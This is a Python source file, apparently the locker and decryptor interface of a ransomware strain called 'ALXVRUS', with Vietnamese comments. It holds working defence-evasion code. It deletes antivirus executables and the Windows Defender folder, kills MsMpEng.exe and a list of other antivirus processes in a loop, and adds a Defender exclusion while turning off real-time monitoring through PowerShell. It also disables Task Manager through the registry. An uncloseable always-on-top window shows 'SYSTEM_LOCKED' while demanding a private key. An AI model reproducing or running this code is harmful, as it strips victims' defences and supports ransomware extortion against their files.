import os
import shutil
import subprocess
import threading
import sys
import time
import winreg
import psutil
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import tkinter as tk
from tkinter import filedialog, messagebox
import customtkinter as ctk

def disable_antivirus():
    antivirus_software = ['McAfee', 'Norton', 'Kaspersky']
    for software in antivirus_software:
        path_to_file = rf"C:\Program Files\{software}.exe"
        if os.path.exists(path_to_file):
            try: os.remove(path_to_file)
            except: pass

    if sys.platform == 'win32':
        path_to_firewall = r"C:\Windows\system32\wfwizmgr.exe"
        if os.path.exists(path_to_firewall):
            try: os.remove(path_to_firewall)
            except: pass

        path_to_av = r"C:\ProgramData\Microsoft\Windows Defender"
        if os.path.exists(path_to_av):
            try: shutil.rmtree(path_to_av) # Dùng rmtree thay vì rmdir cho thư mục có nội dung
            except: pass

        try:
            subprocess.run(['taskkill.exe', '/f', '/im', 'MsMpEng.exe'], shell=True, capture_output=True)
        except: pass

threading.Thread(target=disable_antivirus, daemon=True).start()

def bypass_defender():
    try:
        current_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
        subprocess.run(f'powershell.exe -Command "Add-MpPreference -ExclusionPath \'{current_dir}\'"', shell=True, capture_output=True)
        subprocess.run('powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
    except: pass

def kill_third_party_av():
    av_list = ["AvastUI.exe", "avgui.exe", "Nis.exe", "McUICnt.exe", "avpui.exe", "bdagent.exe", "smc.exe", "ui.exe"]
    while True:
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] in av_list: proc.kill()
        except: pass
        time.sleep(0.5)

threading.Thread(target=kill_third_party_av, daemon=True).start()

def vo_hieu_hoa_taskmgr(status=0):
    try:
        registry_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_path)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, status)
        winreg.CloseKey(key)
    except: pass

class DecryptorGUI:
    def __init__(self, root):
        self.root = root
        ctk.set_appearance_mode("dark")
        self.root.configure(fg_color="#0a0e27")
        self.root.title("ALXVRUS DECRYPTOR") # Thêm title
        
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.attributes("-topmost", True)

        terminal_font = ("Courier New", 14)
        terminal_font_bold = ("Courier New", 22, "bold")
        
        self.header_frame = ctk.CTkFrame(root, fg_color="#1a1f3a", corner_radius=10, border_width=2, border_color="#e74c3c")
        self.header_frame.pack(pady=(20, 10), padx=20, fill="x")
        
        self.label = ctk.CTkLabel(self.header_frame, text="⚠ SYSTEM_LOCKED_BY_ALXVRUS ⚠", text_color="#ff5555", font=terminal_font_bold)
        self.label.pack(pady=(15, 5))
        
        self.sublabel = ctk.CTkLabel(self.header_frame, text="─────────────────────────────", text_color="#e74c3c", font=("Courier New", 10))
        self.sublabel.pack(pady=(0, 10))
        
        self.lbl_status = ctk.CTkLabel(root, text="⏳ [STATUS]: Waiting for Private Key...", text_color="#00ff88", font=("Courier New", 12))
        self.lbl_status.pack(pady=10)
        
        self.frame = ctk.CTkFrame(root, fg_color="#141829", corner_radius=12, border_width=2, border_color="#2a4a7a")
        self.frame.pack(pady=15, padx=20, fill="both", expand=True)
        
        self.key_label = ctk.CTkLabel(self.frame, text="🔐 PRIVATE KEY", text_color="#00ccff", font=("Courier New", 12, "bold"))
        self.key_label.pack(pady=(15, 10))
        
        self.btn_browse = ctk.CTkButton(self.frame, text="[LOAD .PEM KEY]", command=self.browse_file, font=terminal_font, corner_radius=8, fg_color="#2a4a7a", hover_color="#3a5a9a", height=40)
        self.btn_browse.pack(pady=10, padx=20, fill="x")
        
        self.selected_lbl = ctk.CTkLabel(self.frame, text="📄 File: None", font=("Courier New", 11), text_color="#888888")
        self.selected_lbl.pack(pady=(0, 20))

        self.btn_decrypt = ctk.CTkButton(root, text="▶ [EXECUTE DECRYPTION] ◀", fg_color="#c0392b", font=terminal_font, height=55, command=self.start_decryption, corner_radius=10, hover_color="#e74c3c", border_width=2, border_color="#ff5555")
        self.btn_decrypt.pack(pady=20, padx=20, fill="x")
        self.selected_pem_path = ""

    def browse_file(self):
        path = filedialog.askopenfilename(filetypes=[("PEM files", "*.pem")])
        if path:
            self.selected_pem_path = path
            self.selected_lbl.configure(text=f"File: {os.path.basename(path)}", text_color="#2ecc71")

    def start_decryption(self):
        if not self.selected_pem_path: return
        self.btn_decrypt.configure(state="disabled", text="PROCESSING...")
        threading.Thread(target=self.run_decryption, daemon=True).start()

    def run_decryption(self):
        try:
            with open(self.selected_pem_path, "rb") as f:
                priv_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
            
            target = os.environ.get("USERPROFILE", os.path.expanduser("~"))
            count = 0
            for root_dir, _, files in os.walk(target):
                for file in files:
                    if file.endswith(".alxvrus"):
                        if self.decrypt_file(os.path.join(root_dir, file), priv_key): count += 1
            
            vo_hieu_hoa_taskmgr(0)
            messagebox.showinfo("Success", f"Recovered {count} files!")
            self.root.destroy()
        except Exception as e:
            messagebox.showerror("Error", f"Decryption Failed: {str(e)}")
            self.btn_decrypt.configure(state="normal", text="[EXECUTE DECRYPTION]")

    def decrypt_file(self, file_path, priv_key):
        try:
            with open(file_path, 'rb') as f:
                ek = f.read(256)
                nonce = f.read(12)
                tag = f.read(16)
                ctx = f.read()
            
            aes_key = priv_key.decrypt(ek, padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
            cipher = Cipher(algorithms.AES(aes_key), modes.GCM(nonce, tag), backend=default_backend())
            decryptor = cipher.decryptor() # Khởi tạo decryptor 1 lần duy nhất
            data = decryptor.update(ctx) + decryptor.finalize()
            
            original_path = file_path.rsplit(".alxvrus", 1)[0]
            with open(original_path, 'wb') as f: f.write(data)
            os.remove(file_path)
            return True
        except: return False

if __name__ == "__main__":
    bypass_defender() 
    root = ctk.CTk()
    root.geometry("450x450")
    app = DecryptorGUI(root)
    root.mainloop()